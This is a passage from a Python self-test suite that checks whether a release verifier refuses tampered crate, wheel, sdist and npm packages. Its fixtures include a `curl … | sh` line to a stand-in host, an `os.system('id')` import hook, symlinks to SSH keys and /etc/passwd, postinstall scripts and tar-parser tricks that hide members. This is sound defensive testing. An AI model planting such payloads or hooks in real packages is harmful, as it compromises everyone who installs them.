            planted = _npm_wasm(version)
            source = planted[name].decode()
            if old not in source:
                failures.append(f"example plant {label}: {old!r} not found in {name}")
                continue
            planted[name] = source.replace(old, new, 1).encode()
            judge(f"wasm package whose example has {label}",
                  [npm(f"wasm-example-{re.sub(r'[^a-z0-9]+', '-', label)}", planted)], FAIL, *needles)
        # The Node resolver is exported under `node` alone, types first, and through no other key.
        node_only = {"types": "./destination-node.d.ts", "node": "./destination-node.js"}
        for label, key, value in (
                ("a default target on the Node-only resolver", "./destination-node",
                 node_only | {"default": "./destination-node.js"}),
                ("an import target on the Node-only resolver", "./destination-node",
                 node_only | {"import": "./destination-node.js"}),
                ("a browser target on the Node-only resolver", "./destination-node",
                 node_only | {"browser": "./destination.js"}),
                ("the Node-only resolver's types after its node target", "./destination-node",
                 {"node": "./destination-node.js", "types": "./destination-node.d.ts"}),
                ("./destination-node.js exported instead of null", "./destination-node.js", "./destination-node.js"),
                ("a second key exporting the Node resolver", "./server", {"default": "./destination-node.js"}),
                ("a second subpath pattern", "./lib/*", "./*"),
                ("a destination core without its default target", "./destination",
                 {"types": "./destination.d.ts", "import": "./destination.js"}),
                ("the null ./destination-node.js key removed", "./destination-node.js", None)):  # None: removed
            manifest = json.loads(_npm_wasm(version)["package.json"])
            if value is None:
                del manifest["exports"][key]
            else:
                manifest["exports"][key] = value
            judge(f"wasm package with {label}",
                  [npm(f"wasm-exports-{re.sub(r'[^a-z0-9]+', '-', label)}",
                       _npm_wasm(version) | {"package.json": json.dumps(manifest, indent=2).encode()})],
                  FAIL, "browser-safe destination core and Node-only resolver exports")
        # The modules are read as they ship (the copy check refuses each altered file as well).
        for label, name, addition, needles in (
                ("destination.js imports a module", "destination.js", b"import './camera.js';",
                 ("destination.js imports nothing", "import './camera.js'")),
                ("destination.js re-exports the Node resolver", "destination.js",
                 b"export * from './destination-node.js';",
                 ("destination.js imports nothing", "export … from './destination-node.js'")),
                ("destination.js combines signals with AbortSignal.any", "destination.js",
                 b"export const both = (a, b) => AbortSignal.any([a, b]);",
                 ("destination.js stays inside the browser floor", "AbortSignal.any")),
                ("destination.js memoizes with ??=", "destination.js", b"let memo;\nexport const once = () => (memo ??= {});",
                 ("destination.js stays inside the browser floor", "logical assignment ??=")),
                ("destination.js checks well-formed strings", "destination.js",
                 b"export const wellFormed = (s) => s.isWellFormed();",
                 ("destination.js stays inside the browser floor", "isWellFormed")),
                ("destination-node.js imports node:net", "destination-node.js", b"import net from 'node:net';",
                 ("destination-node.js loads only", "imports node:net")),
                ("destination-node.js turns certificate checks off", "destination-node.js",
                 b"export const lax = { rejectUnauthorized: false };",
                 ("destination-node.js loads only", "rejectUnauthorized is not the literal true")),
                ("destination-node.js reads the proxy environment", "destination-node.js",
                 b"export const proxy = () => process.env.HTTPS_PROXY;", ("destination-node.js loads only", "process.env")),
                ("destination-node.js destructures env from process", "destination-node.js",
                 b"const { env } = process;\nexport const proxy = () => env.HTTPS_PROXY;",
                 ("destination-node.js loads only", "process other than process.versions"))):
            files = _npm_wasm(version)
            files[name] += b"\n" + addition + b"\n"
            judge(f"wasm package whose {label}", [npm(f"wasm-read-{re.sub(r'[^a-z0-9]+', '-', label)}", files)], FAIL,
                  *needles)

        for i, planted in enumerate(PLANTED):
            ran += 1
            if not any(pattern.search(planted) for pattern, _why in STRAY):
                failures.append(f"denylist: {planted!r} matches no STRAY pattern")
            judge(f"crate + {planted}", [crate(f"stray-{i}", _clean_crate(version) | {planted: b"x"})],
                  FAIL, planted)
            judge(f"wheel + {PY_MODULE}/{planted}",
                  [wheel(f"wheel-{i}", _clean_wheel(version) | {f"{PY_MODULE}/{planted}": b"x"})],
                  FAIL, planted)
            judge(f"sdist + qrcode-ai-scanner-py/{planted}",
                  [sdist(f"sdist-{i}", _clean_sdist(version) | {f"qrcode-ai-scanner-py/{planted}": b"x"})],
                  FAIL, planted)
            judge(f"platform package + {planted}",
                  [npm(f"platform-{i}", _npm_platform(version, "linux-x64-gnu") | {planted: b"x"})],
                  FAIL, planted)

        # Untracked but innocuous files: the git allowlist alone must catch them.
        judge("crate + an untracked source file", [crate("untracked", _clean_crate(version) | {"src/scratch.rs": b""})],
              FAIL, "src/scratch.rs")
        judge("wheel + a file outside the wheel allowlist",
              [wheel("wheel-extra", _clean_wheel(version) | {f"{PY_MODULE}/notes.txt": b""})],
              FAIL, f"{PY_MODULE}/notes.txt")
        judge("sdist + an untracked core file",
              [sdist("sdist-extra", _clean_sdist(version) | {"qrcode-ai-scanner/src/extra.rs": b""})],
              FAIL, "qrcode-ai-scanner/src/extra.rs")
        # A local scratch directory no stray rule names: the git allowlist and
        # the exact npm file set catch it all the same.
        judge("crate + an untracked scratch directory",
              [crate("scratch-dir", _clean_crate(version) | {".scratch/notes.md": b""})],
              FAIL, ".scratch/notes.md")
        judge("platform package + a scratch directory",
              [npm("platform-scratch", _npm_platform(version, "linux-x64-gnu") | {".scratch/notes.md": b""})],
              FAIL, ".scratch/notes.md")

        # A tar member that is neither a regular file nor a directory never
        # reaches the file-set checks: it fails by itself, whatever its name.
        judge("crate with directory members", [crate("dirs", _clean_crate(version), {
            "src": (tarfile.DIRTYPE, "")})], PASS)
        judge("crate + a symlink member", [crate("symlink", _clean_crate(version), {
            ".ssh/id_rsa": (tarfile.SYMTYPE, "/home/runner/.ssh/id_rsa")})], FAIL, ".ssh/id_rsa (symlink)")
        judge("crate + a hard-link member", [crate("hardlink", _clean_crate(version), {
            "src/main.rs": (tarfile.LNKTYPE, "qrcode-barcode-scanner-0.0.0/src/lib.rs")})], FAIL, "src/main.rs (hard link)")
        judge("sdist + a symlink member", [sdist("sdist-symlink", _clean_sdist(version), {
            "qrcode-ai-scanner-py/src/data.rs": (tarfile.SYMTYPE, "../../../../etc/passwd")})], FAIL, "(symlink)")
        judge("platform package + a FIFO member", [npm("platform-fifo", _npm_platform(version, "linux-x64-gnu"), {
            "pipe": (tarfile.FIFOTYPE, "")})], FAIL, "pipe (FIFO)")

        # Tar-stream differentials: Python's default parse stops at the first
        # all-zero or bad-checksum block, while node-tar (what a consumer's
        # install and `npm publish <tgz>` read) skips a lone zero block, warns
        # past a bad one, then keeps reading. A member hidden behind one, or
        # trailing bytes, or a duplicate name, must fail.
        def raw_crate(name: str, segments) -> pathlib.Path:
            return _raw_tar(place(name, f"qrcode-barcode-scanner-{version}.crate"),
                            f"qrcode-barcode-scanner-{version}", _clean_crate(version), segments)

        def raw_npm(name: str, files: dict, segments, top: str = "package") -> pathlib.Path:
            pkg = json.loads(files["package.json"])
            return _raw_tar(place(name, f"{pkg['name'].lstrip('@').replace('/', '-')}-{version}.tgz"), top, files,
                            segments)

        evil = b"\nrequire('child_process').execSync('curl -s https://example.invalid/x | sh');\n"
        judge("crate: a lone zero block then a hidden member",
              [raw_crate("tar-zero", [("zero",), ("file", "src/evil.rs", b"// hidden\n")])],
              FAIL, "only a lenient parse lists")
        judge("crate: a bad-checksum block then a hidden member",
              [raw_crate("tar-bad", [("bad",), ("file", "src/evil.rs", b"// hidden\n")])],
              FAIL, "only a lenient parse lists")
        judge("crate: non-NUL bytes after a clean end-of-archive",
              [raw_crate("tar-trailing", [("raw", b"\0" * 1024 + b"trailer")])],
              FAIL, "non-NUL byte")
        judge("crate: a duplicate member name",
              [raw_crate("tar-dupe", [("file", "src/lib.rs", b"//! a second copy\n")])],
              FAIL, "duplicate member name")
        # The npm shapes the real-pack differential uses (node-tar yields the
        # altered file; the default parse never sees it): the main package with
        # a lone zero block then an altered index.js, and the wasm package with
        # a bad block then a package.json that adds a postinstall.
        node_index = (NODE_DIR / "index.js").read_bytes()
        judge("main npm package: a lone zero block then an altered index.js",
              [raw_npm("tar-npm-main", _npm_main(version), [("zero",), ("file", "index.js", node_index + evil)])],
              FAIL, "only a lenient parse lists")
        wasm_poisoned = json.loads(_npm_wasm(version)["package.json"])
        wasm_poisoned["scripts"] = {"postinstall": "sh x"}
        judge("wasm npm package: a bad block then a package.json with postinstall",
              [raw_npm("tar-npm-wasm", _npm_wasm(version),
                       [("bad",), ("file", "package.json", json.dumps(wasm_poisoned).encode())])],
              FAIL, "only a lenient parse lists")
        # A clean crate and a clean npm pack built raw (end marker, no segment)
        # still pass: the end-of-archive zeros are not "trailing data".
        judge("crate built raw, no anomaly (control)", [raw_crate("tar-clean", [])], PASS)
        judge("main npm package built raw, no anomaly (control)", [raw_npm("tar-npm-clean", _npm_main(version), [])],
              PASS)

        # The AGPL text where PEP 639 says it is, byte for byte.
        judge("win wheel with a CRLF LICENSE",
              [wheel("wheel-crlf", _clean_wheel(version) | {
                  f"{PY_MODULE}-{version}.dist-info/licenses/LICENSE": crlf})], FAIL, "LICENSE")
        no_root = {k: v for k, v in _clean_sdist(version).items() if k != "LICENSE"}
        judge("sdist with the AGPL text only under qrcode-ai-scanner-py/",
              [sdist("sdist-py-license-only", no_root)], FAIL, "License-File")
        judge("sdist whose License-File is a CRLF copy",
              [sdist("sdist-crlf", _clean_sdist(version) | {"LICENSE": crlf})], FAIL, "License-File")
        globbed = _clean_sdist(version)
        globbed["pyproject.toml"] = globbed["pyproject.toml"].replace(b'license-files = ["LICENSE"]',
                                                                      b'license-files = ["LICENSES/*.txt"]')
        judge("sdist whose pyproject license-files matches nothing", [sdist("sdist-glob", globbed)],
              FAIL, "license-files")

        # auditwheel grafts the shared libraries a Linux wheel links against
        # into qrcode_barcode_scanner.libs/ (musllinux: libgcc_s), named with a
        # hash and listed in RECORD. Nothing else may sit there.
        lib = f"{PY_MODULE}.libs/libgcc_s-f685abf1.so.1"
        musl = _clean_wheel(version, "musllinux_1_2_x86_64")
        judge("musllinux wheel + its grafted libgcc_s, listed in RECORD",
              [wheel("libs-musl", _with_record(musl | {lib: b"\x7fELF"}, version), "musllinux_1_2_x86_64")], PASS)
        judge("manylinux wheel + a grafted library, listed in RECORD",
              [wheel("libs-many", _with_record(_clean_wheel(version) | {
                  f"{PY_MODULE}.libs/libz-eb09ad1d.so.1.2.13": b"\x7fELF"}, version))], PASS)
        judge("musllinux wheel + a grafted library missing from RECORD",
              [wheel("libs-unrecorded", _with_record(musl | {lib: b"\x7fELF"}, version, lib),
                     "musllinux_1_2_x86_64")], FAIL, f"{lib}: not listed in RECORD")
        mac = _clean_wheel(version, "macosx_11_0_arm64")
        judge("macOS wheel + a .libs/ library",
              [wheel("libs-mac", _with_record(mac | {lib: b"\x7fELF"}, version), "macosx_11_0_arm64")],
              FAIL, f"{lib}: not a manylinux or musllinux wheel")
        win = _clean_wheel(version, "win_amd64")
        judge("Windows wheel + a .libs/ library",
              [wheel("libs-win", _with_record(win | {lib: b"MZ"}, version), "win_amd64")],
              FAIL, f"{lib}: not a manylinux or musllinux wheel")
        for name in (f"{PY_MODULE}.libs/libgcc_s-f685abf1.dylib", f"{PY_MODULE}.libs/libgcc_s.so.1",
                     f"{PY_MODULE}.libs/hook-0123abcd.py", f"{PY_MODULE}.libs/x/libz-eb09ad1d.so"):
            slug = re.sub(r"[^a-z0-9]+", "-", name.rsplit("/", 1)[-1])
            judge(f"musllinux wheel + {name}",
                  [wheel(f"libs-{slug}", _with_record(musl | {name: b"\x7fELF"}, version), "musllinux_1_2_x86_64")],
                  FAIL, f"{name}: not <name>-<8 hex>.so[.N]")
        judge("wheel whose WHEEL tags are not its file name's",
              [wheel("tags", _clean_wheel(version, "musllinux_1_2_x86_64"))], FAIL, "WHEEL")

        # The type stubs and the import shim a consumer reads and runs are the
        # checkout's: a Windows-checkout CRLF stub still matches, an altered
        # one or a planted __init__.py does not.
        pyi_crlf = _clean_wheel(version)
        pyi_crlf[f"{PY_MODULE}/__init__.pyi"] = pyi_crlf[f"{PY_MODULE}/__init__.pyi"].replace(b"\n", b"\r\n")
        judge("wheel whose __init__.pyi is the checkout stub with CRLF line endings",
              [wheel("pyi-crlf", _with_record(pyi_crlf, version))], PASS)
        judge("wheel whose __init__.py runs code at import",
              [wheel("init-evil", _with_record(_clean_wheel(version) | {
                  f"{PY_MODULE}/__init__.py": MATURIN_INIT_PY + b"\nimport os; os.system('id')\n"}, version))],
              FAIL, "maturin's generated __init__.py")
        judge("wheel whose __init__.pyi is not the checkout stub",
              [wheel("pyi-evil", _with_record(_clean_wheel(version) | {
                  f"{PY_MODULE}/__init__.pyi": b"# not the committed stub\n"}, version))],
              FAIL, f"{PY_MODULE}.pyi")
        judge("wheel whose py.typed is not the checkout marker",
              [wheel("typed-evil", _with_record(_clean_wheel(version) | {
                  f"{PY_MODULE}/py.typed": b"partial\n"}, version))], FAIL, "py.typed")
        # The sdist's packed sources are the checkout's: pip compiles them where
        # no wheel fits.
        judge("sdist whose core src/lib.rs is not the checkout's",
              [sdist("sdist-lib", _clean_sdist(version) | {
                  "qrcode-ai-scanner/src/lib.rs": b"compile_error!(\"not the commit\");\n"})],
              FAIL, "qrcode-ai-scanner/src/lib.rs")
        judge("sdist whose binding src/lib.rs is not the checkout's",
              [sdist("sdist-pylib", _clean_sdist(version) | {
                  "qrcode-ai-scanner-py/src/lib.rs": b"// not the commit\n"})],
              FAIL, "qrcode-ai-scanner-py/src/lib.rs")
        # Retired Python names: the distribution's file names, its metadata
        # Name and its import package, each refused by name.
        judge(f"wheel named {RETIRED_MODULE}-{version}",
              [_zip(place("wheel-retired-name", f"{RETIRED_MODULE}-{version}-cp38-abi3-manylinux_2_17_x86_64.whl"),
                    _clean_wheel(version))], FAIL, f"file name is {PY_MODULE}-{version}-<tags>.whl")
        judge(f"sdist named {RETIRED_MODULE}-{version}",
              [_tar(place("sdist-retired-name", f"{RETIRED_MODULE}-{version}.tar.gz"), f"{RETIRED_MODULE}-{version}",
                    _clean_sdist(version))], FAIL, f"file name is {PY_MODULE}-{version}.tar.gz",
              f"archive root is {PY_MODULE}-{version}")
        retired_wheel = {name.replace(PY_MODULE, RETIRED_MODULE): data for name, data in _clean_wheel(version).items()
                         if not name.endswith("/RECORD")}
        judge(f"wheel holding the {RETIRED_MODULE} package, its extension and dist-info",
              [wheel("wheel-retired-module", retired_wheel)], FAIL, f"no {RETIRED_MODULE} package",
              f"metadata folder is {PY_MODULE}-{version}.dist-info")
        for planted in (f"{RETIRED_MODULE}/__init__.py", f"{RETIRED_MODULE}/{RETIRED_MODULE}.abi3.so"):
            judge(f"wheel + {planted}",
                  [wheel("wheel-retired-plant", _with_record(_clean_wheel(version) | {planted: b"\x7fELF"}, version))],
                  FAIL, f"no {RETIRED_MODULE} package", RETIRED_MODULE)
        judge(f"sdist + {RETIRED_MODULE}.pyi at its root",
              [sdist("sdist-retired-stub", _clean_sdist(version) | {f"{RETIRED_MODULE}.pyi": b""})],
              FAIL, f"no {RETIRED_MODULE} module or stub")
        retired_meta = _python_metadata(version).replace(f"Name: {PYPI_NAME}\n".encode(), b"Name: qrcode-ai-scanner\n")
        info = f"{PY_MODULE}-{version}.dist-info"
        judge("wheel whose METADATA says Name: qrcode-ai-scanner",
              [wheel("wheel-retired-meta", _with_record(_clean_wheel(version) | {f"{info}/METADATA": retired_meta},
                                                        version))], FAIL, f"Name = {PYPI_NAME}")
        judge("sdist whose PKG-INFO says Name: qrcode-ai-scanner",
              [sdist("sdist-retired-meta", _clean_sdist(version) | {"PKG-INFO": retired_meta})],
              FAIL, f"Name = {PYPI_NAME}")
        # The Rust SBOM, named after the binding's Cargo package: the 0.10
        # file name, no SBOM, and a root component of another package or
        # version are each refused.
        sbom, retired_root = f"{info}/{PY_SBOM}", f"{RETIRED_STEM}-py"
        no_sbom = {name: data for name, data in _clean_wheel(version).items() if name != sbom}
        judge(f"wheel whose SBOM is the 0.10 sboms/{retired_root}.cyclonedx.json",
              [wheel("wheel-retired-sbom", _with_record(no_sbom | {
                  f"{info}/sboms/{retired_root}.cyclonedx.json": _sbom(version, retired_root)}, version))],
              FAIL, "file set is exactly the wheel allowlist", f"{retired_root}.cyclonedx.json",
              f"SBOM {PY_SBOM} present")
        judge("wheel with no SBOM", [wheel("wheel-no-sbom", _with_record(no_sbom, version))], FAIL,
              f"SBOM {PY_SBOM} present", "absent")
        for label, planted, needle in ((f"rooted at {retired_root}", _sbom(version, retired_root), retired_root),
                                       ("rooted at 0.10.1", _sbom("0.10.1"), "0.10.1"),
                                       ("not a CycloneDX document", b"{}\n", "not a CycloneDX document")):
            judge(f"wheel whose SBOM is {label}",
                  [wheel("wheel-sbom-root", _with_record(_clean_wheel(version) | {sbom: planted}, version))],
                  FAIL, f"root component {PY_SBOM_ROOT} {version}", needle)
        # The PyPI README's one previous-name sentence is the table's, release
        # number included, and no archive README states availability.
        pypi_readme = (PY_DIR / "README.md").read_bytes()
        sentence = PREVIOUS_NAMES[("pypi", PYPI_NAME)].encode()
        wrong = pypi_readme.replace(sentence, sentence.replace(b"0.9.0", b"0.10.1"))
        if wrong == pypi_readme:
            failures.append("PyPI README plant: its previous-name sentence is not in the README")
        judge("wheel whose PyPI README says releases up to 0.10.1 were published under the old name",
              [wheel("wheel-readme-0101", _with_record(_clean_wheel(version) | {
                  f"{info}/METADATA": _python_metadata(version, wrong)}, version))],
              FAIL, "METADATA description names a previous name only in its one sentence", "0.10.1")
        judge("sdist whose README says releases up to 0.10.1 were published under the old name",
              [sdist("sdist-readme-0101", _clean_sdist(version) | {"README.md": wrong, "PKG-INFO": _python_metadata(
                  version, wrong)})], FAIL, "README.md names a previous name only in its one sentence", "0.10.1")
        pending = b"\n\nNot yet published on PyPI: build it from source.\n"
        judge("sdist whose README says not yet published",
              [sdist("sdist-readme-pending", _clean_sdist(version) | {
                  "README.md": pypi_readme + pending, "PKG-INFO": _python_metadata(version, pypi_readme + pending)})],
              FAIL, "README.md states no availability", "Not yet published")
        judge("wheel whose README says pending publication",
              [wheel("wheel-readme-pending", _with_record(_clean_wheel(version) | {
                  f"{info}/METADATA": _python_metadata(version, pypi_readme + b"\n\nPending publication.\n")},
                  version))], FAIL, "METADATA description states no availability", "Pending publication")

        # PyPI receives exactly one wheel per row of python.yml's matrix and
        # the sdist: an artifact any job of the run added never rides along.
        pypi = [wheel(f"pypi-{i}", _clean_wheel(version, platform), platform)
                for i, platform in enumerate(SELFTEST_PLATFORMS)]
        pypi_sdist = sdist("pypi-sdist", _clean_sdist(version))
        judge("PyPI set: one wheel per matrix row + the sdist", [*pypi, pypi_sdist], PASS, release_set=True)
        judge("PyPI set: the Windows wheel missing", [*pypi[:-1], pypi_sdist], FAIL, "no Windows x64 wheel",
              release_set=True)
        judge("PyPI set: the sdist missing", [*pypi], FAIL, "sdist", release_set=True)
        judge("PyPI set: an extra py3-none-any wheel",
              [*pypi, pypi_sdist, wheel("pypi-any", _clean_wheel(version, "any", "py3-none"), "any", "py3-none")],
              FAIL, "py3-none-any", release_set=True)
        judge("PyPI set: a second macOS arm64 wheel",
              [*pypi, pypi_sdist, wheel("pypi-mac14", _clean_wheel(version, "macosx_14_0_arm64"), "macosx_14_0_arm64")],
              FAIL, "macOS arm64", release_set=True)

        # pypi-live: before the upload, every file PyPI already serves at this
        # version must be the local one (twine's --skip-existing would skip it
        # by name), and PyPI may serve nothing else there. The one GET is
        # answered from a fixture; it must ask for this project at this version
        # (spelled out here, not derived from PYPI_JSON or PYPI_NAME).
        url = f"https://pypi.org/pypi/qrcode-barcode-scanner/{version}/json"
        digests = {p.name: sha256(p.read_bytes()) for p in (*pypi, pypi_sdist)}
        win, sdist_name, release = pypi[-1].name, pypi_sdist.name, [*pypi, pypi_sdist]

        def answer(files: dict, version_: str = version, yanked=()) -> bytes:
            return json.dumps({"info": {"name": PYPI_NAME, "version": version_}, "urls": [
                {"filename": n, "digests": {"blake2b_256": "0" * 64, "md5": "0" * 32, "sha256": d},
                 "packagetype": "sdist" if n.endswith(".tar.gz") else "bdist_wheel", "yanked": n in yanked}
                for n, d in files.items()]}).encode()

        def judge_live(name: str, paths: list, reply, want: str, *needles: str) -> None:
            nonlocal ran
            ran += 1
            host = Host(build_parser().parse_args(["pypi-live", *map(str, paths)]))
            asked = []

            def opener(request, timeout=None):
                asked.append(request.full_url)
                if isinstance(reply, BaseException):
                    raise reply
                return io.BytesIO(reply)

            host.opener = opener
            try:
                with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                    cmd_pypi_live(host)
            finally:
                shutil.rmtree(host.scratch, ignore_errors=True)
            got = FAIL if any(a.status == FAIL for a in host.artifacts) else PASS
            failed = " · ".join(f"{c.name}: {c.detail}" for a in host.artifacts for c in a.checks if not c.ok)
            missing = [n for n in needles if n not in failed]
            if got != want or missing or asked != [url]:
                failures.append(f"{name}: {got.upper()} (want {want.upper()})"
                                + (f", no failing check names {missing}" if missing else "")
                                + (f", asked for {asked}, not [{url}]" if asked != [url] else "")
                                + (f" — failing: {failed}" if failed else ""))

        def http(code: int, why: str) -> urllib.error.HTTPError:
            return urllib.error.HTTPError(url, code, why, None, None)

        judge_live("pypi-live: no such version on PyPI (404)", release, http(404, "Not Found"), PASS)
        judge_live("pypi-live: the version listed with no file", release, answer({}), PASS)
        judge_live("pypi-live: every file live and identical (a re-run)", release, answer(digests), PASS)
        judge_live("pypi-live: two files live and identical, the rest not yet", release,
                   answer({win: digests[win], sdist_name: digests[sdist_name]}), PASS)
        judge_live("pypi-live: an identical file, yanked", release, answer({win: digests[win]}, yanked={win}), PASS)
        judge_live("pypi-live: a live wheel under its name, other bytes", release, answer({win: "0" * 64}), FAIL,
                   f"{win}: PyPI sha256 0000000000000000… ≠ local {digests[win][:16]}…")
        judge_live("pypi-live: the live sdist differs, the wheels not up yet", release, answer({sdist_name: "1" * 64}),
                   FAIL, sdist_name)
        judge_live("pypi-live: two live files identical, a third other bytes", release,
                   answer({pypi[0].name: digests[pypi[0].name], pypi[1].name: digests[pypi[1].name],
                           pypi[2].name: "2" * 64}), FAIL, pypi[2].name)
        judge_live("pypi-live: a live file the local set does not hold", release,
                   answer({f"{PY_MODULE}-{version}-py3-none-any.whl": "3" * 64}), FAIL, "py3-none-any")
        judge_live("pypi-live: an answer for another version", release, answer(digests, "0.0.1"), FAIL, "'0.0.1'")
        judge_live("pypi-live: an entry without a sha256", release, json.dumps({
            "info": {"version": version}, "urls": [{"filename": win, "digests": {"md5": "0" * 32}}]}).encode(),
                   FAIL, "without a file name and a sha256")
        judge_live("pypi-live: a file listed twice", release, json.dumps({"info": {"version": version}, "urls": [
            {"filename": win, "digests": {"sha256": digests[win]}}] * 2}).encode(), FAIL, "listed twice")
        judge_live("pypi-live: PyPI unavailable (503)", release, http(503, "Service Unavailable"), FAIL, "503")
        judge_live("pypi-live: no network", release, urllib.error.URLError("no route to host"), FAIL,
                   "no route to host")
        judge_live("pypi-live: an answer that is no JSON", release, b"<html>down for maintenance</html>", FAIL,
                   "Expecting value")
        notes = place("pypi-notes", "notes.txt")
        notes.write_bytes(b"x\n")
        judge_live("pypi-live: a file that is neither a wheel nor an sdist", [*release, notes], answer({}), FAIL,
                   "notes.txt")

        # Lifecycle scripts: npm runs them on install (and on a directory
        # publish), never in a tarball we inspected. The main package keeps its
        # committed build/test/prepack scripts and nothing that runs on install.
        for script in ("preinstall", "install", "postinstall", "prepare"):
            judge(f"main + a {script} script", [npm(f"main-{script}", _with_scripts(_npm_main(version), **{
                script: "node -e 1"}))], FAIL, script)
        judge("wasm + prepublishOnly and postinstall scripts",
              [npm("wasm-scripts", _with_scripts(_npm_wasm(version), prepublishOnly="sh x", postinstall="sh y"))],
              FAIL, "prepublishOnly")
        judge("wasm + a harmless-looking test script",
              [npm("wasm-test", _with_scripts(_npm_wasm(version), test="node test.mjs"))], FAIL, "scripts")
        judge("platform package + an install script",
              [npm("platform-install", _with_scripts(_npm_platform(version, "linux-x64-gnu"), install="sh x"))],
              FAIL, "install")
        # A generated manifest carries only its generator's keys: a dependency,
        # a peerDependency, an optionalDependency or a bin pulls install-time
        # code without a `scripts` entry; a publishConfig redirects the upload.
        for field, value in (("dependencies", {"evil-pkg": "1.0.0"}), ("peerDependencies", {"evil-pkg": "*"}),
                             ("optionalDependencies", {"evil-pkg": "1.0.0"}), ("bin", {"qr": "x.js"})):
            pf = _npm_platform(version, "linux-x64-gnu")
            manifest = json.loads(pf["package.json"]) | {field: value}
            judge(f"platform package + {field}",
                  [npm(f"plat-{field}", pf | {"package.json": json.dumps(manifest).encode()})], FAIL, field)
        pf = _npm_platform(version, "linux-x64-gnu")
        manifest = json.loads(pf["package.json"]) | {"publishConfig": {"tag": "next", "provenance": False}}
        judge("platform package + publishConfig beyond registry/access",
              [npm("plat-pc", pf | {"package.json": json.dumps(manifest).encode()})], FAIL, "publishConfig")
        for field, value in (("dependencies", {"evil-pkg": "1.0.0"}), ("publishConfig", {"tag": "next"})):
            wf = _npm_wasm(version)
            manifest = json.loads(wf["package.json"]) | {field: value}
            judge(f"wasm package + {field}",
                  [npm(f"wasm-{field}", wf | {"package.json": json.dumps(manifest, indent=2).encode()})],
                  FAIL, field)

        # The JavaScript a consumer runs, and the manifest, are the committed ones.
        evil = b"\nrequire('child_process').execSync('curl -s https://example.invalid/x | sh');\n"
        for name in ("index.js", "native.js"):
            files = _npm_main(version)
            judge(f"main with an altered {name}", [npm(f"main-{name}", files | {name: files[name] + evil})],
                  FAIL, f"{name} is crates/qrcode-ai-scanner-node/{name} verbatim")
        for label, field, value in (("main pointing elsewhere", "main", "evil.js"),
                                    ("main gaining a bin", "bin", {"qr": "evil.js"}),
                                    ("main gaining a dependency", "dependencies", {"left-pad": "*"})):
            files = _npm_main(version, pins)
            pkg = json.loads(files["package.json"]) | {field: value}
            judge(label, [npm(re.sub(r"[^a-z0-9]+", "-", label), files | {
                "package.json": json.dumps(pkg, indent=2).encode()})], FAIL, f"differs in: {field}")

        # The main npm package pins exactly every napi target at this version.
        for label, optional, want, release_set, needle in (
            ("main, dev build (no pins)", None, PASS, False, ""),
            ("main, every target pinned", pins, PASS, False, ""),
            ("main, release set without pins", None, FAIL, True, "optionalDependencies"),
            ("main, one target missing", {k: v for k, v in pins.items() if not k.endswith("-linux-x64-musl")},
             FAIL, True, "linux-x64-musl"),
            ("main, one pin at another version", pins | {f"{NODE_NAME}-darwin-arm64": "0.0.1"}, FAIL, True,
             "darwin-arm64"),
            ("main, an unknown extra pin", pins | {f"{NODE_NAME}-linux-riscv64-gnu": version}, FAIL, True,
             "linux-riscv64-gnu"),
            ("main, dev build with a stale pin", pins | {f"{NODE_NAME}-win32-x64-msvc": "0.8.1"}, FAIL, False,
             "win32-x64-msvc"),
        ):
            slug = re.sub(r"[^a-z0-9]+", "-", label)
            judge(label, [npm(slug, _npm_main(version, optional))], want, *filter(None, [needle]),
                  release_set=release_set)
        # --release-set over tarballs: one platform tarball per pin, no more.
        main = npm("set", _npm_main(version, pins))
        platforms = [npm(f"set-{suffix}", _npm_platform(version, suffix)) for suffix in napi_suffixes()]
        judge("release set: main + one tarball per pin", [main, *platforms], PASS, release_set=True)
        judge("release set: a pinned platform tarball missing", [main, *platforms[:-1]], FAIL,
              napi_suffixes()[-1], release_set=True)
        judge("release set + the wasm tarball", [main, *platforms, npm("set-wasm", _npm_wasm(version))], FAIL,
              f"{WASM_NAME} is neither the main package nor pinned by it", release_set=True)
        twin = _npm_platform(version, napi_suffixes()[0]) | {"README.md": b"# a second build\n"}
        judge("release set + a second copy of a platform package", [main, *platforms, npm("set-twin", twin)], FAIL,
              f"{NODE_NAME}-{napi_suffixes()[0]} appears 2 times", release_set=True)

        # Retired npm names, each refused by name: a 0.10 tarball, a pin, an
        # addon file, a loader lookup; and the packages beside the platform
        # packages (-wasm, -mcp) are never read as one.
        def renamed_npm(files: dict, name: str) -> dict:
            return files | {"package.json": json.dumps(json.loads(files["package.json"]) | {"name": name}).encode()}

        retired_platform = renamed_npm(_npm_platform(version, "darwin-arm64"),
                                       f"{RETIRED_SCOPE}qrcode-ai-scanner-darwin-arm64")
        judge("release set + an @supernovae-st/ platform tarball",
              [main, *platforms, npm("set-retired", retired_platform)], FAIL,
              f"{RETIRED_SCOPE}qrcode-ai-scanner-darwin-arm64 is a retired name", "package name is no retired name",
              release_set=True)
        judge("an @supernovae-st/ main package", [npm("retired-main", renamed_npm(
            _npm_main(version, pins), f"{RETIRED_SCOPE}qrcode-ai-scanner"))], FAIL, "package name is no retired name",
              "known package name")
        judge("an @supernovae-st/ wasm package", [npm("retired-wasm", renamed_npm(
            _npm_wasm(version), f"{RETIRED_SCOPE}qrcode-ai-scanner-wasm"))], FAIL, "package name is no retired name",
              "known package name")
        retired_pins = {key.replace(NODE_NAME, f"{RETIRED_SCOPE}qrcode-ai-scanner"): value for key, value in pins.items()}
        for label, optional in (("one pin", pins | {f"{RETIRED_SCOPE}qrcode-ai-scanner-darwin-arm64": version}),
                                ("every pin", retired_pins)):
            judge(f"main pinning a 0.10 platform package ({label})",
                  [npm(f"retired-pin-{label.replace(' ', '-')}", _npm_main(version, optional))], FAIL,
                  f"{RETIRED_SCOPE}qrcode-ai-scanner-darwin-arm64 is a retired name")
        old_addon = "qrcode-ai-scanner.darwin-arm64.node"
        old_platform = {key: value for key, value in _npm_platform(version, "darwin-arm64").items()
                        if not key.endswith(".node")} | {old_addon: b"\x7fELF"}
        old_manifest = json.loads(old_platform["package.json"]) | {"main": old_addon, "files": [old_addon]}
        judge("platform package shipping the 0.10 addon file name",
              [npm("retired-addon", old_platform | {"package.json": json.dumps(old_manifest).encode()})], FAIL,
              f"the addon is {NODE_BINARY}.darwin-arm64.node", old_addon)
        native = (NODE_DIR / "native.js").read_text()
        retired_lookups = (
            ("an @supernovae-st/ platform package", f"require('{NODE_NAME}-darwin-arm64')",
             f"require('{RETIRED_SCOPE}qrcode-ai-scanner-darwin-arm64')", "names a retired package or file"),
            ("a qrcode-ai-scanner addon file", f"require('./{NODE_BINARY}.darwin-arm64.node')",
